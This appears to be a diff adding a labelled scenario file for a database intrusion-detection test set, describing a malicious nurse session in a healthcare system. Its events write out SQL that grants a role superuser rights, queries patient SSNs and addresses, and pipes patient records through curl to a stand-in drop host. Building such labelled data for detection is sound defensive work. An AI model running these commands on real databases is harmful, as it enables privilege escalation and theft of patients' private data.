@@ -1,0 +1,23 @@
+scenario_id: healthcare_alter_role_esc_0014
+family_id: healthcare_alter_role_esc_0014
+domain: healthcare
+time_of_day: 02:00
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate
+  role: nurse
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.768457052657173
+  events:
+  - sql: ALTER ROLE him_officer WITH SUPERUSER
+  - sql: SELECT ssn, address, full_name, date_of_birth FROM patients WHERE primary_doctor_id NOT IN (SELECT doctor_id FROM doctors WHERE department_id = 'DEPT-PATH')
+  - step_id: exfil
+    sql: COPY (SELECT p.ssn, p.address, p.date_of_birth, p.phone FROM patients p) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
